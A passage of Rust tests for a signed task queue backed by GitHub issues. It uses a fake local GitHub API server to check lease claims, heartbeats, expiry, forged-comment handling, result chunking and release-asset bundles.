        let text: String = checks.iter().map(|k| k.to_string()).collect::<Vec<_>>().join("\n");
        assert!(text.contains("api_key_file"), "the missing credential is named: {text}");
    }
}

mod multi_queue {
    use crate::manifest::peek_manifest;
    use crate::queue::{InMemoryQueue, MultiQueue, QueueClient};
    use std::sync::Arc;
    use std::time::Duration;

    struct Down;
    impl QueueClient for Down {
        fn available(&self) -> crate::Result<Vec<crate::dsse::Envelope>> {
            Err(crate::Error::Queue("down".into()))
        }
        fn claim(&self, _: &str, _: &str, _: Duration) -> crate::Result<()> {
            Err(crate::Error::Queue("down".into()))
        }
        fn heartbeat(&self, _: &str, _: &str, _: Duration) -> crate::Result<()> {
            Err(crate::Error::Queue("down".into()))
        }
        fn submit(&self, _: &crate::result::SignedResult) -> crate::Result<()> {
            Err(crate::Error::Queue("down".into()))
        }
        fn bundle(&self, _: &str) -> crate::Result<Option<Vec<u8>>> {
            Err(crate::Error::Queue("down".into()))
        }
        fn release(&self, _: &str, _: &str) -> crate::Result<()> {
            Err(crate::Error::Queue("down".into()))
        }
    }

    #[test]
    fn several_queues_route_claims_home_and_survive_one_being_down() {
        let f = super::fixture("multiq");
        let (a, b) = (Arc::new(InMemoryQueue::default()), Arc::new(InMemoryQueue::default()));
        a.post(super::task("m-a", "a", 1, &f.key_a).sign(&f.key_a).unwrap());
        b.post(super::task("m-b", "a", 1, &f.key_a).sign(&f.key_a).unwrap());
        let multi = MultiQueue::new(vec![a.clone(), Arc::new(Down), b.clone()]);
        let ids: std::collections::BTreeSet<String> = multi.available().unwrap().iter().map(|t| peek_manifest(t).unwrap().id).collect();
        assert_eq!(ids, ["m-a".to_string(), "m-b".to_string()].into(), "tasks from both, the dead one skipped");
        multi.claim("m-b", "r1", Duration::from_secs(60)).unwrap();
        assert!(b.available().unwrap().is_empty(), "the claim reached queue b");
        assert_eq!(a.available().unwrap().len(), 1, "and not a");
        assert!(multi.claim("never-seen", "r1", Duration::from_secs(60)).is_err());
        let all_down = MultiQueue::new(vec![Arc::new(Down)]);
        assert!(all_down.available().is_err(), "all down is an error, not an empty queue");
    }
}

pub(crate) mod github_queue {
    use crate::github_queue::*;
    use crate::manifest::peek_manifest;
    use crate::queue::QueueClient;
    use serde_json::{json, Value};
    use std::io::{BufRead, BufReader, Read, Write};
    use std::sync::atomic::{AtomicI64, AtomicU64, Ordering};
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    pub(crate) const TOKEN: &str = "gh-test-token";
    pub(crate) const BOARD_TOKEN: &str = "board-token";
    /// Who the token acts as: the workflow's own bot.
    pub(crate) const BOT: &str = "github-actions[bot]";

    #[derive(Default)]
    pub(crate) struct Issue {
        pub(crate) number: u64,
        pub(crate) title: String,
        pub(crate) body: String,
        pub(crate) labels: Vec<String>,
        pub(crate) pr: bool,
        pub(crate) closed: bool,
        pub(crate) merged: bool,
        pub(crate) author: String,
        /// Last change (unix secs), for `updated_at` and `since`.
        pub(crate) updated: i64,
        pub(crate) comments: Vec<(u64, String, i64, i64)>, // id, body, created, updated (unix secs)
    }

    #[derive(Default)]
    pub(crate) struct State {
        pub(crate) issues: Vec<Issue>,
        pub(crate) assets: Vec<(u64, String, Vec<u8>)>,
        pub(crate) release: bool,
        pub(crate) next_id: u64,
        pub(crate) not_modified: u64,
        pub(crate) requests: u64,
        pub(crate) pulls: Vec<(u64, String, String, String, String)>, // number, head, base, title, body
        pub(crate) files: Vec<(String, Vec<u8>)>,
        pub(crate) head: String,
        /// Comment authors by comment id (the token's comments are the bot's).
        pub(crate) comment_authors: std::collections::HashMap<u64, String>,
        /// Repository permission by login; anyone else has `read`.
        pub(crate) permissions: std::collections::HashMap<String, String>,
        /// GraphQL requests received (`query`, `variables`).
        pub(crate) graphql: Vec<Value>,
        /// Projects board fields the fake GraphQL reports: (name, options).
        pub(crate) board_fields: Vec<(String, Vec<String>)>,
    }

    impl State {
        /// A person opens an issue.
        pub(crate) fn open_issue(&mut self, login: &str, title: &str, body: &str, labels: &[&str]) -> u64 {
            let number = self.issues.len() as u64 + 1;
            let updated = chrono::Utc::now().timestamp();
            self.issues.push(Issue { number, title: title.into(), body: body.into(), labels: labels.iter().map(|l| l.to_string()).collect(), author: login.into(), updated, ..Default::default() });
            number
        }
        /// A person comments.
        pub(crate) fn say(&mut self, issue: u64, login: &str, body: &str) -> u64 {
            self.next_id += 1;
            let id = self.next_id;
            let t = chrono::Utc::now().timestamp();
            let i = self.issues.iter_mut().find(|i| i.number == issue).expect("issue");
            i.comments.push((id, body.into(), t, t));
            i.updated = t;
            self.comment_authors.insert(id, login.into());
            id
        }
        pub(crate) fn issue(&self, number: u64) -> &Issue {
            self.issues.iter().find(|i| i.number == number).expect("issue")
        }
        pub(crate) fn issue_mut(&mut self, number: u64) -> &mut Issue {
            self.issues.iter_mut().find(|i| i.number == number).expect("issue")
        }
    }

    /// A tiny stand-in for the parts of GitHub's REST API the queue uses. `advance` moves its clock.
    pub(crate) struct Fake {
        addr: std::net::SocketAddr,
        pub(crate) state: Arc<Mutex<State>>,
        offset: Arc<AtomicI64>,
        stop: Arc<std::sync::atomic::AtomicBool>,
    }

    impl Fake {
        pub(crate) fn start() -> Fake {
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            listener.set_nonblocking(true).unwrap();
            let addr = listener.local_addr().unwrap();
            let state = Arc::new(Mutex::new(State { next_id: 1000, ..Default::default() }));
            let offset = Arc::new(AtomicI64::new(0));
            let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
            let (st, off, flag) = (state.clone(), offset.clone(), stop.clone());
            std::thread::spawn(move || {
                while !flag.load(Ordering::Relaxed) {
                    match listener.accept() {
                        Ok((s, _)) => {
                            let (st, off) = (st.clone(), off.clone());
                            std::thread::spawn(move || {
                                let _ = serve(s, &st, &off, addr);
                            });
                        }
                        Err(_) => std::thread::sleep(Duration::from_millis(10)),
                    }
                }
            });
            Fake { addr, state, offset, stop }
        }
        pub(crate) fn api(&self) -> String {
            format!("http://{}", self.addr)
        }
        fn advance(&self, secs: i64) {
            self.offset.fetch_add(secs, Ordering::Relaxed);
        }
        pub(crate) fn queue(&self, token: Option<&str>) -> GitHubQueue {
            GitHubQueue::new(&self.api(), "org/proj", DEFAULT_LABEL, token.map(String::from))
        }
    }

    impl Drop for Fake {
        fn drop(&mut self) {
            self.stop.store(true, Ordering::Relaxed);
        }
    }

    fn now(off: &AtomicI64) -> i64 {
        chrono::Utc::now().timestamp() + off.load(Ordering::Relaxed)
    }

    fn iso(t: i64) -> String {
        chrono::DateTime::from_timestamp(t, 0).unwrap().to_rfc3339_opts(chrono::SecondsFormat::Secs, true)
    }

    fn serve(mut s: std::net::TcpStream, st: &Mutex<State>, off: &AtomicI64, addr: std::net::SocketAddr) -> std::io::Result<()> {
        let mut r = BufReader::new(s.try_clone()?);
        let mut line = String::new();
        r.read_line(&mut line)?;
        let mut p = line.split_whitespace();
        let (method, target) = (p.next().unwrap_or("").to_string(), p.next().unwrap_or("").to_string());
        let (mut len, mut auth, mut inm) = (0usize, String::new(), String::new());
        loop {
            let mut h = String::new();
            if r.read_line(&mut h)? == 0 || h.trim().is_empty() {
                break;
            }
            if let Some((k, v)) = h.split_once(':') {
                match k.trim().to_ascii_lowercase().as_str() {
                    "content-length" => len = v.trim().parse().unwrap_or(0),
                    "authorization" => auth = v.trim().to_string(),
                    "if-none-match" => inm = v.trim().to_string(),
                    _ => {}
                }
            }
        }
        let mut body = vec![0u8; len];
        r.read_exact(&mut body)?;
        let (path, query) = target.split_once('?').unwrap_or((&target, ""));
        let q = |k: &str| query.split('&').filter_map(|kv| kv.split_once('=')).find(|(a, _)| *a == k).map(|(_, v)| v.to_string());
        let page: usize = q("page").and_then(|p| p.parse().ok()).unwrap_or(1);
        let per: usize = q("per_page").and_then(|p| p.parse().ok()).unwrap_or(30);
        let t = now(off);
        let parts: Vec<&str> = path.trim_start_matches('/').split('/').collect();
        let json_body = || serde_json::from_slice::<Value>(&body).unwrap_or(Value::Null);
        let mut st = st.lock().unwrap();
        st.requests += 1;
        let writes_need_token = method != "GET";
        // The Projects board has its own token, valid for GraphQL only.
        let board_ok = path == "/graphql" && auth == format!("Bearer {BOARD_TOKEN}");
        let (status, ctype, out): (u16, &str, Vec<u8>) = if writes_need_token && auth != format!("Bearer {TOKEN}") && !board_ok {
            (401, "application/json", br#"{"message":"Bad credentials"}"#.to_vec())
        } else {
            let authors = st.comment_authors.clone();
            let comment_json = |c: &(u64, String, i64, i64)| {
                let login = authors.get(&c.0).cloned().unwrap_or_else(|| BOT.into());
                json!({"id": c.0, "body": c.1, "created_at": iso(c.2), "updated_at": iso(c.3), "user": {"login": login, "type": if login.ends_with("[bot]") { "Bot" } else { "User" }}})
            };
            let issue_json = |i: &Issue| {
                let mut v = json!({"number": i.number, "title": i.title, "body": i.body, "comments": i.comments.len(), "state": if i.closed { "closed" } else { "open" },
                    "node_id": format!("I_{}", i.number), "updated_at": iso(i.updated),
                    "user": {"login": i.author, "type": if i.author.ends_with("[bot]") { "Bot" } else { "User" }}});
                if i.pr {
                    v["pull_request"] = json!({"url": "x", "merged_at": if i.merged { json!(iso(t)) } else { Value::Null }});
                }
                v
            };
            match (method.as_str(), parts.as_slice()) {
                ("GET", ["repos", "org", "proj", "issues"]) => {
                    let label = q("labels").unwrap_or_default();
                    let state_q = q("state").unwrap_or_default();
                    let since = q("since").and_then(|s| chrono::DateTime::parse_from_rfc3339(&s.replace("%3A", ":")).ok()).map_or(i64::MIN, |d| d.timestamp());
                    let all: Vec<Value> = st.issues.iter().filter(|i| i.labels.contains(&label) && (state_q == "all" || (state_q == "closed") == i.closed) && i.updated >= since).map(issue_json).collect();
                    (200, "application/json", serde_json::to_vec(&all.into_iter().skip((page - 1) * per).take(per).collect::<Vec<_>>()).unwrap())
                }
                ("POST", ["repos", "org", "proj", "issues"]) => {
                    let v = json_body();
                    st.next_id += 1;
                    let number = st.issues.len() as u64 + 1;
                    st.issues.push(Issue { number, title: v["title"].as_str().unwrap_or("").into(), body: v["body"].as_str().unwrap_or("").into(), labels: v["labels"].as_array().map(|l| l.iter().filter_map(|x| x.as_str().map(String::from)).collect()).unwrap_or_default(), author: BOT.into(), updated: t, ..Default::default() });
                    (201, "application/json", json!({"number": number}).to_string().into_bytes())
                }
                ("GET", ["repos", "org", "proj", "issues", n, "comments"]) => {
                    let n: u64 = n.parse().unwrap_or(0);
                    match st.issues.iter().find(|i| i.number == n) {
                        Some(i) => (200, "application/json", serde_json::to_vec(&i.comments.iter().skip((page - 1) * per).take(per).map(comment_json).collect::<Vec<_>>()).unwrap()),
                        None => (404, "application/json", b"{}".to_vec()),
                    }
                }
                ("POST", ["repos", "org", "proj", "issues", n, "comments"]) => {
                    let n: u64 = n.parse().unwrap_or(0);
                    st.next_id += 1;
                    let id = st.next_id;
                    let text = json_body()["body"].as_str().unwrap_or("").to_string();
                    match st.issues.iter_mut().find(|i| i.number == n) {
                        Some(i) => {
                            i.comments.push((id, text.clone(), t, t));
                            i.updated = t;
                            (201, "application/json", json!({"id": id}).to_string().into_bytes())
                        }
                        None => (404, "application/json", b"{}".to_vec()),
                    }
                }
                ("PATCH", ["repos", "org", "proj", "issues", "comments", id]) => {
                    let id: u64 = id.parse().unwrap_or(0);
                    let text = json_body()["body"].as_str().unwrap_or("").to_string();
                    match st.issues.iter_mut().flat_map(|i| i.comments.iter_mut()).find(|c| c.0 == id) {
                        Some(c) => {
                            c.1 = text;
                            c.3 = t;
                            (200, "application/json", json!({"id": id}).to_string().into_bytes())
                        }
                        None => (404, "application/json", b"{}".to_vec()),
                    }
                }
                ("GET", ["repos", "org", "proj", "releases", "tags", _]) if st.release => {
                    let assets: Vec<Value> = st.assets.iter().map(|(id, name, _)| json!({"name": name, "url": format!("http://{addr}/assets/{id}")})).collect();
                    (200, "application/json", json!({"id": 1, "upload_url": format!("http://{addr}/uploads/assets{{?name,label}}"), "assets": assets}).to_string().into_bytes())
                }
                ("GET", ["repos", "org", "proj", "releases", "tags", _]) => (404, "application/json", b"{}".to_vec()),
                ("POST", ["repos", "org", "proj", "releases"]) => {
                    st.release = true;
                    (201, "application/json", json!({"id": 1, "upload_url": format!("http://{addr}/uploads/assets{{?name,label}}"), "assets": []}).to_string().into_bytes())
                }
                ("POST", ["uploads", "assets"]) => {
                    st.next_id += 1;
                    let id = st.next_id;
                    let name = q("name").unwrap_or_default();
                    st.assets.push((id, name, body.clone()));
                    (201, "application/json", json!({"id": id}).to_string().into_bytes())
                }
                ("GET", ["repos", "org", "proj", "issues", n]) => match st.issues.iter().find(|i| i.number.to_string() == *n) {
                    Some(i) => (200, "application/json", issue_json(i).to_string().into_bytes()),
                    None => (404, "application/json", b"{}".to_vec()),
                },
                ("GET", ["repos", "org", "proj", "collaborators", login, "permission"]) => {
                    let perm = st.permissions.get(*login).cloned().unwrap_or_else(|| "read".into());
                    (200, "application/json", json!({"permission": perm}).to_string().into_bytes())
                }
                ("PATCH", ["repos", "org", "proj", "pulls", n]) => {
                    let n: u64 = n.parse().unwrap_or(0);
                    let closing = json_body()["state"] == "closed";
                    match st.issues.iter_mut().find(|i| i.number == n && i.pr) {
                        Some(i) => {
                            i.closed = closing;
                            i.updated = t;
                            (200, "application/json", json!({"number": n}).to_string().into_bytes())
                        }
                        None => (404, "application/json", b"{}".to_vec()),
                    }
                }
                ("POST", ["graphql"]) => {
                    let v = json_body();
                    st.graphql.push(v.clone());
                    let q = v["query"].as_str().unwrap_or("");
                    let out = if q.contains("projectV2(number") {
                        let nodes: Vec<Value> = st.board_fields.iter().map(|(name, opts)| {
                            let mut f = json!({"id": format!("F_{name}"), "name": name});
                            if !opts.is_empty() {
                                f["options"] = Value::Array(opts.iter().map(|o| json!({"id": format!("O_{o}"), "name": o})).collect());
                            }
                            f
                        }).collect();
                        json!({"data": {"owner": {"projectV2": {"id": "PVT_1", "fields": {"nodes": nodes}}}}})
                    } else if q.contains("addProjectV2ItemById") {
                        json!({"data": {"addProjectV2ItemById": {"item": {"id": format!("PVTI_{}", v["variables"]["content"].as_str().unwrap_or(""))}}}})
                    } else if q.contains("updateProjectV2ItemFieldValue") {
                        let field = v["variables"]["field"].as_str().unwrap_or("").to_string();
                        if st.board_fields.iter().any(|(n, _)| format!("F_{n}") == field) {
                            json!({"data": {"updateProjectV2ItemFieldValue": {"projectV2Item": {"id": v["variables"]["item"]}}}})
                        } else {
                            json!({"errors": [{"message": format!("field {field} not found")}]})
                        }
                    } else {
                        json!({"errors": [{"message": "unknown query"}]})
                    };
                    (200, "application/json", out.to_string().into_bytes())
                }
                ("PATCH", ["repos", "org", "proj", "issues", n]) => {
                    let n: u64 = n.parse().unwrap_or(0);
                    let closing = json_body()["state"] == "closed";
                    match st.issues.iter_mut().find(|i| i.number == n) {
                        Some(i) => {
                            i.closed = closing;
                            i.updated = t;
                            (200, "application/json", json!({"number": n}).to_string().into_bytes())
                        }
                        None => (404, "application/json", b"{}".to_vec()),
                    }
                }
                ("GET", ["repos", "org", "proj", "pulls"]) => {
                    let head = q("head").unwrap_or_default().replace("%3A", ":");
                    let want = head.split_once(':').map(|x| x.1.to_string());
                    let open_only = q("state").as_deref() == Some("open");
                    let list: Vec<Value> = st.pulls.iter().filter(|p| want.as_ref().is_none_or(|w| &p.1 == w)).filter(|p| !open_only || st.issues.iter().any(|i| i.number == p.0 && !i.closed)).map(|p| json!({"number": p.0, "head": {"ref": p.1}, "base": {"ref": p.2}, "title": p.3, "body": p.4})).collect();
                    (200, "application/json", serde_json::to_vec(&list).unwrap())
                }
                ("POST", ["repos", "org", "proj", "pulls"]) => {
                    let v = json_body();
                    let number = 500 + st.pulls.len() as u64;
                    st.pulls.push((number, v["head"].as_str().unwrap_or("").into(), v["base"].as_str().unwrap_or("").into(), v["title"].as_str().unwrap_or("").into(), v["body"].as_str().unwrap_or("").into()));
                    // A pull request is also an issue (comments, labels, state).
                    st.issues.push(Issue { number, title: v["title"].as_str().unwrap_or("").into(), body: v["body"].as_str().unwrap_or("").into(), labels: vec!["toto".into()], pr: true, author: BOT.into(), updated: t, ..Default::default() });
                    (201, "application/json", json!({"number": number}).to_string().into_bytes())
                }
                ("POST", ["repos", "org", "proj", "issues", _, "labels"]) => (200, "application/json", b"[]".to_vec()),
                ("GET", ["repos", "org", "proj", "commits", "HEAD"]) => (200, "application/json", json!({"sha": st.head}).to_string().into_bytes()),
                ("GET", ["repos", "org", "proj", "contents", rest @ ..]) => {
                    let want = rest.join("/");
                    if let Some(f) = st.files.iter().find(|f| f.0 == want) {
                        (200, "application/octet-stream", f.1.clone())
                    } else {
                        let prefix = format!("{want}/");
                        let mut entries: Vec<Value> = vec![];
                        for (p, _) in st.files.iter().filter(|f| f.0.starts_with(&prefix)) {
                            let rest = &p[prefix.len()..];
                            let (name, kind) = match rest.split_once('/') { Some((d, _)) => (d, "dir"), None => (rest, "file") };
                            let path = format!("{prefix}{name}");
                            if !entries.iter().any(|e| e["path"] == path) {
                                entries.push(json!({"name": name, "path": path, "type": kind}));
                            }
                        }
                        if entries.is_empty() {
                            (404, "application/json", br#"{"message":"Not Found"}"#.to_vec())
                        } else {
                            (200, "application/json", Value::Array(entries).to_string().into_bytes())
                        }
                    }
                }
                ("GET", ["assets", id]) => match st.assets.iter().find(|a| a.0.to_string() == *id) {
                    Some(a) => (200, "application/octet-stream", a.2.clone()),
                    None => (404, "application/json", b"{}".to_vec()),
                },
                _ => (404, "application/json", br#"{"message":"Not Found"}"#.to_vec()),
            }
        };
        let etag = format!("\"{}\"", &crate::archive::sha256_hex(&out)[..16]);
        let (status, out) = if method == "GET" && status == 200 && ctype == "application/json" && inm == etag {
            st.not_modified += 1;
            (304, vec![])
        } else {
            (status, out)
        };
        write!(s, "HTTP/1.1 {status} X\r\nContent-Type: {ctype}\r\nETag: {etag}\r\nDate: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n", chrono::DateTime::from_timestamp(t, 0).unwrap().to_rfc2822(), out.len())?;
        s.write_all(&out)
    }

    struct Project {
        key: ed25519_dalek::SigningKey,
        fake: Fake,
    }

    fn project() -> Project {
        let f = super::fixture("ghq");
        Project { key: f.key_a, fake: Fake::start() }
    }

    fn post(p: &Project, id: &str) -> u64 {
        let env = super::task(id, "a", 10, &p.key).sign(&p.key).unwrap();
        p.fake.queue(Some(TOKEN)).post_task(&env).unwrap()
    }

    fn secs(n: u64) -> Duration {
        Duration::from_secs(n)
    }

    #[test]
    fn the_lease_lifecycle_works_through_issue_comments() {
        let p = project();
        let runner = p.fake.queue(Some(TOKEN));
        assert_eq!(post(&p, "g1"), 1);
        // Things that look like tasks but are not: a pull request, an unsigned/garbled body, no marker.
        {
            let mut st = p.fake.state.lock().unwrap();
            let env_body = st.issues[0].body.clone();
            st.issues.push(Issue { number: 2, body: env_body, labels: vec!["toto".into()], pr: true, ..Default::default() });
            st.issues.push(Issue { number: 3, body: "<!-- toto:task -->\n```json\n{not json}\n```".into(), labels: vec!["toto".into()], ..Default::default() });
            st.issues.push(Issue { number: 4, body: "just a bug report".into(), labels: vec!["toto".into()], ..Default::default() });
        }
        let ids: Vec<String> = runner.available().unwrap().iter().map(|t| peek_manifest(t).unwrap().id).collect();
        assert_eq!(ids, ["g1"], "only the real task issue is a task");

        runner.claim("g1", "runner-a", secs(60)).unwrap();
        let other = p.fake.queue(Some(TOKEN));
        assert!(other.claim("g1", "runner-b", secs(60)).is_err(), "a second runner is refused");
        assert!(other.heartbeat("g1", "runner-b", secs(60)).is_err(), "only the holder renews");
        runner.heartbeat("g1", "runner-a", secs(60)).unwrap();
        assert!(other.available().unwrap().is_empty(), "leased tasks are not offered");
        assert_eq!(p.fake.state.lock().unwrap().issues[0].comments.len(), 1, "heartbeats edit the claim, they do not add comments");
        runner.release("g1", "runner-a").unwrap();
        assert_eq!(other.available().unwrap().len(), 1, "released tasks come back");
        other.claim("g1", "runner-b", secs(60)).unwrap();
    }

    #[test]
    fn leases_expire_and_heartbeats_extend_them_by_server_time() {
        let p = project();
        let (a, b) = (p.fake.queue(Some(TOKEN)), p.fake.queue(Some(TOKEN)));
        post(&p, "g2");
        a.claim("g2", "runner-a", secs(60)).unwrap();
        p.fake.advance(40);
        a.heartbeat("g2", "runner-a", secs(60)).unwrap();
        p.fake.advance(40); // 80s after the claim, 40s after the heartbeat
        assert!(b.claim("g2", "runner-b", secs(60)).is_err(), "the heartbeat kept the lease alive");
        p.fake.advance(30); // now 70s after the heartbeat
        assert_eq!(b.available().unwrap().len(), 1, "an expired lease frees the task");
        b.claim("g2", "runner-b", secs(60)).unwrap();
        assert!(a.heartbeat("g2", "runner-a", secs(60)).is_err(), "the old holder learns it lost the lease");
    }

    #[test]
    fn exactly_one_of_many_simultaneous_claims_wins() {
        let p = project();
        post(&p, "g3");
        let wins = Arc::new(AtomicU64::new(0));
        let handles: Vec<_> = (0..8).map(|i| {
            let (q, wins) = (p.fake.queue(Some(TOKEN)), wins.clone());
            std::thread::spawn(move || {
                q.available().unwrap(); // learn the issue number first, as the runner does
                if q.claim("g3", &format!("{:064x}", i), secs(60)).is_ok() {
                    wins.fetch_add(1, Ordering::Relaxed);
                }
            })
        }).collect();
        for h in handles {
            h.join().unwrap();
        }
        assert_eq!(wins.load(Ordering::Relaxed), 1);
    }

    #[test]
    fn hostile_comments_cannot_hide_or_hold_a_task_for_long() {
        let p = project();
        let q = p.fake.queue(Some(TOKEN));
        post(&p, "g4");
        let junk = [
            "<!-- toto:result runner=ab sum=000000000000 part=1/1 -->\n```json\n{}\n```".to_string(), // not a signed result
            "<!-- toto:result runner=ab sum=000000000000 part=9/2 -->\n```json\nx\n```".to_string(), // bad part numbers
            "<!-- toto:claim runner=zz lease=oops released=0 beat=0 -->".to_string(), // unparsable lease
        ];
        {
            let mut st = p.fake.state.lock().unwrap();
            for (i, j) in junk.iter().enumerate() {
                let t = chrono::Utc::now().timestamp();
                st.issues[0].comments.push((10 + i as u64, j.clone(), t, t));
            }
        }
        assert_eq!(q.available().unwrap().len(), 1, "garbage comments change nothing");
        // A genuine-looking result for a *different* task does not finish this one.
        let other = crate::result::SignedResult::package("someone-else", "x".into(), 1, &crate::manifest::OutputSchema { format: "text".into(), max_bytes: 100, max_artifact_bytes: 0 }, &crate::manifest::generate_key(), None).unwrap();
        {
            let mut st = p.fake.state.lock().unwrap();
            let json = serde_json::to_string(&other).unwrap();
            let sum = &crate::archive::sha256_hex(json.as_bytes())[..12];
            let t = chrono::Utc::now().timestamp();
            st.issues[0].comments.push((20, format!("<!-- toto:result runner=x sum={sum} part=1/1 -->\n```json\n{json}\n```"), t, t));
            // an absurd lease from a stranger is clamped to six hours
            st.issues[0].comments.push((21, "<!-- toto:claim runner=stranger lease=999999999 released=0 beat=0 -->".into(), t, t));
        }
        assert!(q.available().unwrap().is_empty(), "the stranger holds the lease...");
        p.fake.advance(6 * 3600 + 5);
        assert_eq!(q.available().unwrap().len(), 1, "...but only for six hours");
    }

    #[test]
    fn a_runner_completes_a_task_end_to_end_and_the_project_reads_the_result() {
        let p = project();
        let f = super::fixture("ghq-run");
        let mut trusted = crate::manifest::TrustedProjects::default();
        trusted.insert("a", p.key.verifying_key());
        let q = Arc::new(p.fake.queue(Some(TOKEN)));
        let mut runner = crate::runner::Runner::new(
            super::policy(), trusted, crate::manifest::generate_key(), q.clone(),
            crate::harness::EchoHarness { tokens_per_run: 10 }, crate::sandbox::DirSandbox { root: f.dir.join("work") },
            |_: &crate::manifest::TaskManifest, _: &crate::result::SignedResult| false,
            crate::audit::AuditLog::new(f.dir.join("audit.jsonl")),
        );
        post(&p, "g5");
        assert_eq!(runner.tick(chrono::Local::now()).unwrap(), crate::runner::Tick::Submitted("g5".into()));
        assert!(q.available().unwrap().is_empty(), "a finished task is gone");
        let results = p.fake.queue(None).results().unwrap(); // the project reads without a token
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].open().unwrap().task_id, "g5");
        let before = p.fake.state.lock().unwrap().issues[0].comments.len();
        q.submit(&results[0]).unwrap();
        assert_eq!(p.fake.state.lock().unwrap().issues[0].comments.len(), before, "resubmitting adds nothing");
    }

    #[test]
    fn large_results_are_split_across_comments_and_reassembled() {
        let p = project();
        post(&p, "g6");
        let q = p.fake.queue(Some(TOKEN));
        q.available().unwrap();
        let key = crate::manifest::generate_key();
        let schema = crate::manifest::OutputSchema { format: "text".into(), max_bytes: 400_000, max_artifact_bytes: 0 };
        let output: String = (0..150_000).map(|i| if i % 997 == 0 { 'é' } else { 'x' }).collect(); // multi-byte chars too
        let r = crate::result::SignedResult::package("g6", output.clone(), 5, &schema, &key, None).unwrap();
        q.submit(&r).unwrap();
        let parts = p.fake.state.lock().unwrap().issues[0].comments.len();
        assert!((3..=8).contains(&parts), "{parts} parts");
        let back = p.fake.queue(None).results().unwrap();
        assert_eq!(back.len(), 1);
        assert_eq!(back[0].open().unwrap().output, output);
        // too big for the limit is an error, not a silent truncation
        let huge = crate::result::SignedResult::package("g6", "y".repeat(700_000), 5, &crate::manifest::OutputSchema { format: "text".into(), max_bytes: 800_000, max_artifact_bytes: 0 }, &key, None).unwrap();
        assert!(q.submit(&huge).unwrap_err().to_string().contains("max_artifact_bytes"));
        // a partial post is completed by a retry, not duplicated
        {
            let mut st = p.fake.state.lock().unwrap();
            st.issues[0].comments.truncate(2);
        }
        assert!(p.fake.queue(None).results().unwrap().is_empty(), "an incomplete result is not a result");
        q.submit(&r).unwrap();
        assert_eq!(p.fake.state.lock().unwrap().issues[0].comments.len(), parts, "only the missing parts were posted");
        assert_eq!(p.fake.queue(None).results().unwrap().len(), 1);
    }

    #[test]
    fn bundles_are_release_assets_named_by_hash() {
        let p = project();
        let project_side = p.fake.queue(Some(TOKEN));
        let runner = p.fake.queue(None); // downloads need no token
        assert_eq!(runner.bundle(&"0".repeat(64)).unwrap(), None, "no release yet");
        let h = project_side.upload_bundle(b"tar-bytes").unwrap();
        assert_eq!(h, crate::archive::sha256_hex(b"tar-bytes"));
        assert_eq!(project_side.upload_bundle(b"tar-bytes").unwrap(), h, "uploading twice stores once");
        assert_eq!(p.fake.state.lock().unwrap().assets.len(), 1);
        assert_eq!(runner.bundle(&h).unwrap().as_deref(), Some(&b"tar-bytes"[..]));
        assert_eq!(runner.bundle(&"1".repeat(64)).unwrap(), None);
        assert!(runner.bundle("../x").is_err());
    }

    #[test]
    fn unchanged_polls_use_etags_and_failures_say_what_to_check() {
        let p = project();
        post(&p, "g7");
        let q = p.fake.queue(Some(TOKEN));
        q.available().unwrap();
        q.available().unwrap();
        assert!(p.fake.state.lock().unwrap().not_modified >= 1, "the second poll revalidated instead of re-downloading");
        let anon = p.fake.queue(None);
        let e = anon.claim("g7", "r", secs(60)).unwrap_err().to_string();
        assert!(e.contains("401") && e.contains("token"), "{e}");
        let wrong = GitHubQueue::new(&p.fake.api(), "org/other", DEFAULT_LABEL, Some(TOKEN.into()));
        assert!(wrong.available().unwrap_err().to_string().contains("404"));
    }

    #[test]
    fn claim_ordering_is_decided_by_comment_order() {
        use chrono::{TimeZone, Utc};
        let t = |s: i64| Utc.timestamp_opt(1_800_000_000 + s, 0).unwrap();
        let claim = |id: u64, runner: &str, lease: u64, created: i64, updated: i64| (id, format!("<!-- toto:claim runner={runner} lease={lease} released=0 beat=0 -->"), t(created), t(updated));
        // b's comment came second while a held the lease: a stays the holder.
        let c = vec![claim(1, "a", 100, 0, 0), claim(2, "b", 100, 10, 10)];
        assert_eq!(holder_at(&c, t(20)).unwrap().runner, "a");
        // after a's lease ran out, b's later claim would have won, but b claimed too early: nobody holds it.
        assert_eq!(holder_at(&c, t(150)), None);
        // b claims after a's lease ended: b holds.
        let c = vec![claim(1, "a", 100, 0, 0), claim(2, "b", 100, 150, 150)];
        assert_eq!(holder_at(&c, t(160)).unwrap().runner, "b");
        // a heartbeat (edit) keeps a's lease past b's attempt.
        let c = vec![claim(1, "a", 100, 0, 120), claim(2, "b", 100, 110, 110)];
        assert_eq!(holder_at(&c, t(130)).unwrap().runner, "a");
    }

    // ------------------------------------------------------------------ results to pull requests

    use crate::archive::Record;
    use crate::pr_flow::{run as to_prs, Options, Outcome};
    use std::path::{Path, PathBuf};
    use std::process::Command;

    fn git(dir: &Path, args: &[&str]) -> String {
        let o = Command::new("git").current_dir(dir).args(args).output().unwrap();
        assert!(o.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&o.stderr));
        String::from_utf8_lossy(&o.stdout).trim().to_string()
    }

    /// A bare "origin" and a working clone of it, with `main` holding the given files.
    fn repo(name: &str, files: &[(&str, &str)]) -> (PathBuf, PathBuf) {
        let root = super::fixture(name).dir;
        let (remote, work) = (root.join("remote.git"), root.join("work"));
        std::fs::create_dir_all(&remote).unwrap();
        git(&remote, &["init", "-q", "--bare", "-b", "main"]);
        git(&root, &["clone", "-q", remote.to_str().unwrap(), "work"]);
        git(&work, &["config", "user.email", "t@example.org"]);
        git(&work, &["config", "user.name", "t"]);
        git(&work, &["checkout", "-q", "-b", "main"]);
        for (p, c) in files {
            std::fs::create_dir_all(work.join(p).parent().unwrap()).unwrap();
            std::fs::write(work.join(p), c).unwrap();
        }
        git(&work, &["add", "-A"]);
        git(&work, &["commit", "-q", "-m", "init"]);
        git(&work, &["push", "-q", "origin", "main"]);
        (remote, work)
    }

    fn file(path: &str, data: &str) -> Record {
        Record::File { path: path.into(), mode: 0o644, data: data.as_bytes().to_vec() }
    }

    /// Posts task `id` as the project and submits `records` as a runner's result.
    fn finished(p: &Project, id: &str, output: &str, records: &[Record]) -> ed25519_dalek::SigningKey {
        let mut m = super::task(id, "a", 10, &p.key);
        m.output_schema.max_bytes = 10_000;
        m.output_schema.max_artifact_bytes = 1 << 20;
